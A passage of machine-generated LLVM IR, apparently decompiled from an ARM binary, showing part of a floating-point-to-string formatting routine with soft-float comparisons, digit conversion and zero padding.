  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_16324, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_16314
  %v5_16338 = or i32 %v1_16258.v0_162445, 4
  store i32 %v5_16338, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_16314, %bb210
  %v4_1633c = phi i32 [ %v5_16338, %bb210 ], [ 3, %dec_label_pc_16314 ]
  %v4_1633c.v1_16258.v0_16244 = select i1 %tmp274, i32 %v4_1633c, i32 %v1_16258.v0_162445
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_16350 = add i32 %v4_1633c.v1_16258.v0_16244, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33052)
  store i32 %v2_16350, i32* %r2.global-to-local, align 4
  %v2_16354 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_16354, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1687c

dec_label_pc_16360:                               ; preds = %.thread9
  %v0_16360 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16360, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_16368 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16368, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_16370 = call i32 @__aeabi_dcmplt(i32 %v0_16368, i32 %v0_16360, i32 0, i32 1100470148)
  store i32 %v6_16370, i32* %r0.global-to-local, align 4
  %v2_16374 = icmp eq i32 %v6_16370, 0
  store i1 %v2_16374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16374, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_16360
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_16360, %bb211
  %v0_1637c = phi i32 [ 0, %dec_label_pc_16360 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33028), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33028), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_163b0 = icmp eq i32 %v0_1637c, 0
  br label %dec_label_pc_163a0

dec_label_pc_163a0:                               ; preds = %dec_label_pc_16438.dec_label_pc_163a0_crit_edge, %bb212
  %v2_163a8 = phi i32 [ add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33028), %bb212 ], [ %v2_163a8.pre, %dec_label_pc_16438.dec_label_pc_163a0_crit_edge ]
  %v0_163a4 = phi i32 [ 9, %bb212 ], [ %v0_16438, %dec_label_pc_16438.dec_label_pc_163a0_crit_edge ]
  %v2_163e8 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_16438.dec_label_pc_163a0_crit_edge ]
  store i32 %v0_1637c, i32* %r2.global-to-local, align 4
  %v1_163a4 = add i32 %v0_163a4, -1
  store i32 %v1_163a4, i32* %sl.global-to-local, align 4
  store i32 %v2_163a8, i32* @lr, align 4
  %v3_163ac = mul i32 %v1_163a4, 8
  store i32 %v3_163ac, i32* %r3.global-to-local, align 4
  store i1 %v2_163b0, i1* %cpsr_z.global-to-local, align 1
  %v0_163b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_163b4, i32* %r0.global-to-local, align 4
  %v0_163b8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_163b8, i32* %r1.global-to-local, align 4
  %v2_163bc = add i32 %v3_163ac, %v2_163a8
  store i32 %v2_163bc, i32* %ip.global-to-local, align 4
  %v1_163f8 = inttoptr i32 %v2_163bc to i32*
  %v2_163f8 = load i32, i32* %v1_163f8, align 4
  %v3_163f8 = sext i32 %v2_163f8 to i64
  %v1_163fc = sext i32 %v0_163b4 to i64
  %v2_163fc = bitcast i64 %v1_163fc to double
  br i1 %v2_163b0, label %dec_label_pc_163f8, label %dec_label_pc_163c4

dec_label_pc_163c4:                               ; preds = %dec_label_pc_163a0
  %v8_163c8 = bitcast i64 %v3_163f8 to double
  %v9_163c8 = fmul double %v2_163fc, %v8_163c8
  %v10_163c8 = fptrunc double %v9_163c8 to float
  %v11_163c8 = bitcast float %v10_163c8 to i32
  store i32 %v11_163c8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_163c8, i32* %r7.global-to-local, align 4
  store i32 %v0_163b8, i32* %r8.global-to-local, align 4
  %v4_163dc = call i32 @__aeabi_dcmplt(i32 %v11_163c8, i32 %v0_163b8, i32 0, i32 1104006501)
  store i32 %v4_163dc, i32* %r0.global-to-local, align 4
  %v2_163e0 = icmp eq i32 %v4_163dc, 0
  store i1 %v2_163e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163e0, label %dec_label_pc_16438, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_163c4
  %v1_163e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_163e8 = sub i32 %v2_163e8, %v1_163e8
  store i32 %v3_163e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163a0
  store i32 %v0_163b8, i32* @r1, align 4
  %v8_16404 = bitcast i64 %v3_163f8 to double
  %v9_16404 = fdiv double %v2_163fc, %v8_16404
  %v10_16404 = fptrunc double %v9_16404 to float
  %v11_16404 = bitcast float %v10_16404 to i32
  store i32 %v11_16404, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_16404, i32* %r7.global-to-local, align 4
  store i32 %v0_163b8, i32* %r8.global-to-local, align 4
  %v4_16418 = call i32 @__aeabi_dcmpge(i32 %v11_16404, i32 %v0_163b8, i32 0, i32 1100470148)
  store i32 %v4_16418, i32* %r0.global-to-local, align 4
  %v2_1641c = icmp eq i32 %v4_16418, 0
  store i1 %v2_1641c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1641c, label %dec_label_pc_16438, label %dec_label_pc_16424

dec_label_pc_16424:                               ; preds = %dec_label_pc_163f8
  %v1_16428 = load i32, i32* %r4.global-to-local, align 4
  %v2_16428 = add i32 %v1_16428, %v2_163e8
  store i32 %v2_16428, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %.thread10, %dec_label_pc_16424
  %stack_var_-192.2 = phi i32 [ %v2_16428, %dec_label_pc_16424 ], [ %v3_163e8, %.thread10 ]
  %v0_16430 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16430, i32* %r5.global-to-local, align 4
  %v0_16434 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16434, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16438

dec_label_pc_16438:                               ; preds = %dec_label_pc_163c4, %dec_label_pc_163f8, %dec_label_pc_16430
  %stack_var_-192.3 = phi i32 [ %v2_163e8, %dec_label_pc_163f8 ], [ %stack_var_-192.2, %dec_label_pc_16430 ], [ %v2_163e8, %dec_label_pc_163c4 ]
  %v0_16438 = load i32, i32* %sl.global-to-local, align 4
  %v2_16438 = icmp eq i32 %v0_16438, 0
  store i1 %v2_16438, i1* %cpsr_z.global-to-local, align 1
  %v0_1643c = load i32, i32* %r4.global-to-local, align 4
  %v3_1643c = sdiv i32 %v0_1643c, 2
  store i32 %v3_1643c, i32* %r4.global-to-local, align 4
  br i1 %v2_16438, label %dec_label_pc_16444, label %dec_label_pc_16438.dec_label_pc_163a0_crit_edge

dec_label_pc_16438.dec_label_pc_163a0_crit_edge:  ; preds = %dec_label_pc_16438
  %v2_163a8.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_163a0

dec_label_pc_16444:                               ; preds = %dec_label_pc_16438
  %v0_16444 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16444, i32* @r0, align 4
  %v0_16448 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16448, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_16454 = call i32 @__aeabi_dcmpge(i32 %v0_16444, i32 %v0_16448, i32 0, i32 1104006501)
  store i32 %v6_16454, i32* %r0.global-to-local, align 4
  %v2_16458 = icmp eq i32 %v6_16454, 0
  store i1 %v2_16458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16458, label %dec_label_pc_16488, label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %dec_label_pc_16444
  %v0_16460 = load i32, i32* %r5.global-to-local, align 4
  %v1_16460 = sext i32 %v0_16460 to i64
  %v2_16460 = bitcast i64 %v1_16460 to double
  %v0_16464 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16464, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_16470 = fdiv double %v2_16460, 0.000000e+00
  %v10_16470 = fptrunc double %v9_16470 to float
  %v11_16470 = bitcast float %v10_16470 to i32
  store i32 %v11_16470, i32* %r0.global-to-local, align 4
  store i32 %v11_16470, i32* %r5.global-to-local, align 4
  %v1_16480 = add i32 %stack_var_-192.3, 1
  store i32 %v1_16480, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %dec_label_pc_16460, %bb208, %dec_label_pc_16444, %dec_label_pc_162a8
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_16444 ], [ -1, %dec_label_pc_162a8 ], [ -1, %bb208 ], [ %v1_16480, %dec_label_pc_16460 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1648c = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1648c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %dec_label_pc_16508, %dec_label_pc_16488
  %v0_16490 = load i32, i32* %r6.global-to-local, align 4
  %v0_16494 = load i32, i32* %r5.global-to-local, align 4
  %v1_16498 = sext i32 %v0_16494 to i64
  %v2_16498 = bitcast i64 %v1_16498 to double
  %v3_16498 = fptoui double %v2_16498 to i32
  store i32 %v3_16498, i32* %r8.global-to-local, align 4
  store i32 %v3_16498, i32* %r2.global-to-local, align 4
  store i32 %v0_16490, i32* %r3.global-to-local, align 4
  store i32 %v0_16494, i32* @r0, align 4
  store i32 %v0_16490, i32* %r1.global-to-local, align 4
  %v6_164b4 = call i32 @__aeabi_dsub(i32 %v0_16494, i32 %v0_16490, i32 %v3_16498, i32 %v0_16490)
  %v7_164b4 = sext i32 %v6_164b4 to i64
  %v8_164b4 = bitcast i64 %v7_164b4 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_164c0 = fmul double %v8_164b4, 0.000000e+00
  %v10_164c0 = fptrunc double %v9_164c0 to float
  %v11_164c0 = bitcast float %v10_164c0 to i32
  store i32 %v11_164c0, i32* %r0.global-to-local, align 4
  %v0_164c4 = load i32, i32* %sl.global-to-local, align 4
  %v1_164c4 = add i32 %v0_164c4, 9
  store i32 %v1_164c4, i32* %sl.global-to-local, align 4
  store i32 %v11_164c0, i32* %r5.global-to-local, align 4
  store i32 %v0_16490, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_164d4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_164d4

dec_label_pc_164d4:                               ; preds = %dec_label_pc_164d4.dec_label_pc_164d4_crit_edge, %dec_label_pc_16490
  %v1_164e8 = phi i32 [ %v1_164e8.pre, %dec_label_pc_164d4.dec_label_pc_164d4_crit_edge ], [ %v1_164c4, %dec_label_pc_16490 ]
  %v0_164e0 = phi i32 [ %v0_164fc, %dec_label_pc_164d4.dec_label_pc_164d4_crit_edge ], [ 0, %dec_label_pc_16490 ]
  %v0_164ec = phi i32 [ %v2_164f8, %dec_label_pc_164d4.dec_label_pc_164d4_crit_edge ], [ %v0_164d4.pre, %dec_label_pc_16490 ]
  %v3_164dc = urem i32 %v0_164ec, 10
  %v1_164e0 = add i32 %v0_164e0, 1
  store i32 %v1_164e0, i32* %r7.global-to-local, align 4
  %v1_164e4 = or i32 %v3_164dc, 48
  store i32 %v1_164e4, i32* %r2.global-to-local, align 4
  %v2_164e8 = sub i32 %v1_164e8, %v1_164e0
  store i32 %v2_164e8, i32* %r3.global-to-local, align 4
  store i32 %v0_164ec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_164f4 = trunc i32 %v1_164e4 to i8
  %v3_164f4 = inttoptr i32 %v2_164e8 to i8*
  store i8 %v1_164f4, i8* %v3_164f4, align 1
  %v0_164f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_164f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_164f8 = udiv i32 %v0_164f8, %v1_164f8
  store i32 %v2_164f8, i32* %r0.global-to-local, align 4
  %v0_164fc = load i32, i32* %r7.global-to-local, align 4
  %v7_164fc = icmp eq i32 %v0_164fc, 8
  store i1 %v7_164fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_164f8, i32* %r8.global-to-local, align 4
  %v7_16504 = icmp slt i32 %v0_164fc, 9
  br i1 %v7_16504, label %dec_label_pc_164d4.dec_label_pc_164d4_crit_edge, label %dec_label_pc_16508

dec_label_pc_164d4.dec_label_pc_164d4_crit_edge:  ; preds = %dec_label_pc_164d4
  %v1_164e8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_164d4

dec_label_pc_16508:                               ; preds = %dec_label_pc_164d4
  %v0_16508 = load i32, i32* %r4.global-to-local, align 4
  %v1_16508 = add i32 %v0_16508, 1
  store i32 %v1_16508, i32* %r4.global-to-local, align 4
  %v7_1650c = icmp eq i32 %v0_16508, 0
  store i1 %v7_1650c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1650c, label %dec_label_pc_16490, label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_16508
  %v0_16514 = load i32, i32* %sb.global-to-local, align 4
  %v7_16514 = icmp eq i32 %v0_16514, 96
  store i1 %v7_16514, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_16514, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_16514
  %v5_16524 = add i32 %v0_16514, 32
  store i32 %v5_16524, i32* %r3.global-to-local, align 4
  %v5_16528 = urem i32 %v5_16524, 256
  store i32 %v5_16528, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_16514
  %v4_16520.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_16520.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_16520126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_16548 = phi i32 [ %v0_16514, %thread-pre-split ], [ %v5_16528, %bb213 ]
  %v7_1652c = icmp eq i32 %v0_16548, 103
  %. = zext i1 %v7_1652c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_16538 = load i32, i32* %fp.global-to-local, align 4
  %v2_16538 = icmp eq i32 %v0_16538, 0
  store i1 %v2_16538, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_16538, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_16540 = icmp eq i1 %v7_1652c, false
  store i1 %v2_16540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16540, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_16544 = add i32 %v0_16538, -1
  store i32 %v2_16544, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_16558 = phi i32 [ %v0_16538, %.thread16 ], [ %v0_16538, %bb218 ], [ %v2_16544, %bb219 ]
  %v7_16548 = icmp eq i32 %v0_16548, 102
  store i1 %v7_16548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16548, label %dec_label_pc_16554, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_16558, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1657c

dec_label_pc_16554:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_16558 = add i32 %v0_16558, %stack_var_-192.4
  store i32 %v2_16558, i32* %ip.global-to-local, align 4
  %v8_1655c = icmp eq i32 %v2_16558, -1
  store i1 %v8_1655c, i1* %cpsr_z.global-to-local, align 1
  %v6_16560 = icmp slt i32 %v2_16558, -1
  br i1 %v6_16560, label %dec_label_pc_16564, label %dec_label_pc_1657c

dec_label_pc_16564:                               ; preds = %dec_label_pc_16554
  %v2_16564 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_16564, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_16570 = bitcast i32* %stack_var_-83 to i8*
  %v3_16570 = call i32 @__GI_memset(i8* %v2_16570, i32 48)
  store i32 %v3_16570, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1657c

dec_label_pc_1657c:                               ; preds = %bb221, %dec_label_pc_16554, %dec_label_pc_16564
  %v1_165c092 = phi i32 [ %v3_16570, %dec_label_pc_16564 ], [ %v2_164f8, %dec_label_pc_16554 ], [ %v2_164f8, %bb221 ]
  %v1_165a4 = phi i32 [ -1, %dec_label_pc_16564 ], [ %v2_16558, %dec_label_pc_16554 ], [ %v0_16558, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_16564 ], [ %stack_var_-192.4, %dec_label_pc_16554 ], [ %stack_var_-192.4, %bb221 ]
  %v1_16580 = add i32 %v1_165a4, -16
  %v3_16580 = sub i32 15, %v1_165a4
  %v4_16580 = and i32 %v3_16580, %v1_165a4
  %v5_16580 = icmp slt i32 %v4_16580, 0
  %v6_16580 = icmp slt i32 %v1_16580, 0
  %v7_16580 = icmp eq i32 %v1_165a4, 16
  store i1 %v7_16580, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1658c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1658c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_16594 = xor i1 %v6_16580, %v5_16580
  %v4_16594 = or i1 %v7_16580, %v3_16594
  br i1 %v4_16594, label %dec_label_pc_165a0, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_1657c
  %v7_16594137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_16594137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_165a0:                               ; preds = %dec_label_pc_1657c
  %v2_165a0 = ptrtoint i32* %stack_var_-82 to i32
  %v2_165a4 = add i32 %v1_165a4, %v2_165a0
  store i32 %v2_165a4, i32* %r3.global-to-local, align 4
  %v1_165a8 = add i32 %v2_165a4, 2
  %v2_165a8 = inttoptr i32 %v1_165a8 to i8*
  %v3_165a8 = load i8, i8* %v2_165a8, align 1
  %v4_165a8 = zext i8 %v3_165a8 to i32
  store i32 %v4_165a8, i32* %r2.global-to-local, align 4
  store i32 %v1_165a8, i32* %r1.global-to-local, align 4
  %v2_165b0 = icmp ugt i8 %v3_165a8, 51
  %v7_165b0 = icmp eq i8 %v3_165a8, 52
  store i1 %v7_165b0, i1* %cpsr_z.global-to-local, align 1
  %v2_165b4 = xor i1 %v2_165b0, true
  %v3_165b4 = or i1 %v7_165b0, %v2_165b4
  br i1 %v3_165b4, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_165a0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_165a0, %bb222
  %v1_165c090 = phi i32 [ %v1_165c092, %dec_label_pc_165a0 ], [ 0, %bb222 ]
  %v2_165b8 = xor i1 %v7_165b0, true
  %v3_165b8 = and i1 %v2_165b0, %v2_165b8
  br i1 %v3_165b8, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_165bc = phi i32 [ %v0_165bc.pre, %._crit_edge87 ], [ %v7_16594137141, %.thread140 ], [ %v1_165a8, %bb223 ], [ %v1_165a8, %bb224 ]
  %v1_165c0 = phi i32 [ %v1_165c0.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_165c090, %bb223 ], [ 1, %bb224 ]
  %v1_165bc = add i32 %v0_165bc, -1
  %v2_165bc = inttoptr i32 %v1_165bc to i8*
  %v3_165bc = load i8, i8* %v2_165bc, align 1
  %v4_165bc = zext i8 %v3_165bc to i32
  store i32 %v1_165bc, i32* %r1.global-to-local, align 4
  %v2_165c0 = add i32 %v4_165bc, %v1_165c0
  %v1_165c4 = urem i32 %v2_165c0, 256
  store i32 %v1_165c4, i32* %r3.global-to-local, align 4
  %v2_165c8 = icmp ugt i32 %v1_165c4, 56
  %v7_165c8 = icmp eq i32 %v1_165c4, 57
  store i1 %v7_165c8, i1* %cpsr_z.global-to-local, align 1
  %v2_165cc = xor i1 %v2_165c8, true
  %v3_165cc = or i1 %v7_165c8, %v2_165cc
  br i1 %v3_165cc, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_165d0 = xor i1 %v7_165c8, true
  %v3_165d0 = and i1 %v2_165c8, %v2_165d0
  br i1 %v3_165d0, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_165d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_165d8 = phi i32 [ %v1_165d8.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_165d4 = icmp eq i32 %v1_165c4, 48
  store i1 %v7_165d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_165d4, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_165d8 = or i32 %v1_165d8, 1
  store i32 %v2_165d8, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_165dc = phi i32 [ 1, %bb229 ], [ %v1_165d8, %bb228 ]
  %v2_165dc = icmp eq i32 %v0_165dc, 0
  store i1 %v2_165dc, i1* %cpsr_z.global-to-local, align 1
  %v1_165e0 = trunc i32 %v2_165c0 to i8
  store i8 %v1_165e0, i8* %v2_165bc, align 1
  %v0_165e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_165e4, label %dec_label_pc_165e8, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_165c0.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_165bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_165e8:                               ; preds = %._crit_edge93
  store i32 %v2_1658c, i32* %r2.global-to-local, align 4
  %v2_165ec = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_165ec, i32* %r3.global-to-local, align 4
  %v0_165f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_165f0 = icmp uge i32 %v0_165f0, %v2_165ec
  %v9_165f0 = icmp eq i32 %v0_165f0, %v2_165ec
  store i1 %v9_165f0, i1* %cpsr_z.global-to-local, align 1
  %v2_165f4 = xor i1 %v3_165f0, true
  %v3_165f4 = or i1 %v9_165f0, %v2_165f4
  br i1 %v3_165f4, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_165e8
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_165ec, i32* %r2.global-to-local, align 4
  store i32 %v2_165ec, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_165e8, %bb230
  %v2_16614 = phi i32 [ %v2_165ec, %bb230 ], [ %v0_165f0, %dec_label_pc_165e8 ]
  %v4_16608144 = phi i32 [ %v2_165ec, %bb230 ], [ %v2_1658c, %dec_label_pc_165e8 ]
  %v2_16600 = xor i1 %v9_165f0, true
  %v3_16600 = and i1 %v3_165f0, %v2_16600
  br i1 %v3_16600, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_165f4, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_16604 = load i32, i32* @lr, align 4
  %v5_16604 = add i32 %v4_16604, 1
  store i32 %v5_16604, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_16600, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_16608 = add i32 %v4_16608144, 2
  store i32 %v5_16608, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16610 = load i32, i32* %sb.global-to-local, align 4
  %v7_16610 = icmp eq i32 %v0_16610, 103
  store i1 %v7_16610, i1* %cpsr_z.global-to-local, align 1
  %v3_16614 = add i32 %v2_16614, 1
  %v4_16614 = inttoptr i32 %v3_16614 to i8*
  store i8 0, i8* %v4_16614, align 1
  %v0_16618 = load i32, i32* %r1.global-to-local, align 4
  %v1_16618 = add i32 %v0_16618, 1
  store i32 %v1_16618, i32* %lr.global-to-local, align 4
  %v0_1661c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1661c, label %dec_label_pc_16620, label %dec_label_pc_16648

dec_label_pc_16620:                               ; preds = %bb236
  %v0_16620 = load i32, i32* %r0.global-to-local, align 4
  %v1_16620 = load i32, i32* %ip.global-to-local, align 4
  %v2_16620 = sub i32 %v0_16620, %v1_16620
  %v4_16620 = xor i32 %v1_16620, %v0_16620
  %v5_16620 = xor i32 %v2_16620, %v0_16620
  %v6_16620 = and i32 %v5_16620, %v4_16620
  %v7_16620 = icmp slt i32 %v6_16620, 0
  %v8_16620 = icmp slt i32 %v2_16620, 0
  %v9_16620 = icmp eq i32 %v0_16620, %v1_16620
  %v3_16624 = xor i1 %v8_16620, %v7_16620
  %v4_16624 = or i1 %v9_16620, %v3_16624
  %.258 = zext i1 %v4_16624 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1662c = add i32 %v0_16620, 4
  %v3_1662c = sub i32 0, %v0_16620
  %v4_1662c = and i32 %v1_1662c, %v3_1662c
  %v5_1662c = icmp slt i32 %v4_1662c, 0
  %v6_1662c = icmp slt i32 %v1_1662c, 0
  %v7_1662c = icmp eq i32 %v1_1662c, 0
  store i1 %v7_1662c, i1* %cpsr_z.global-to-local, align 1
  %v2_16630 = xor i1 %v6_1662c, %v5_1662c
  br i1 %v2_16630, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_16620
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16964

bb239:                                            ; preds = %dec_label_pc_16620
  %v2_16634 = icmp eq i1 %v4_16624, false
  store i1 %v2_16634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16634, label %dec_label_pc_16964, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_16638 = sub i32 %v1_16620, %v0_16620
  store i32 %v3_16638, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16654

dec_label_pc_16648:                               ; preds = %bb236
  %v0_16648 = load i32, i32* %sb.global-to-local, align 4
  %v7_16648 = icmp eq i32 %v0_16648, 102
  store i1 %v7_16648, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16648, i32* %r8.global-to-local, align 4
  br i1 %v7_16648, label %dec_label_pc_16648.dec_label_pc_16654_crit_edge, label %dec_label_pc_16664

dec_label_pc_16648.dec_label_pc_16654_crit_edge:  ; preds = %dec_label_pc_16648
  %v0_16654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %.thread24, %dec_label_pc_16648.dec_label_pc_16654_crit_edge
  %v0_16654 = phi i32 [ %v0_16654.pre, %dec_label_pc_16648.dec_label_pc_16654_crit_edge ], [ %v0_16620, %.thread24 ]
  %v1_16654 = icmp slt i32 %v0_16654, 0
  %v2_16654 = icmp eq i32 %v0_16654, 0
  store i1 %v2_16654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16654, label %bb240, label %dec_label_pc_16664

bb240:                                            ; preds = %dec_label_pc_16654
  store i32 48, i32* %r3.global-to-local, align 4
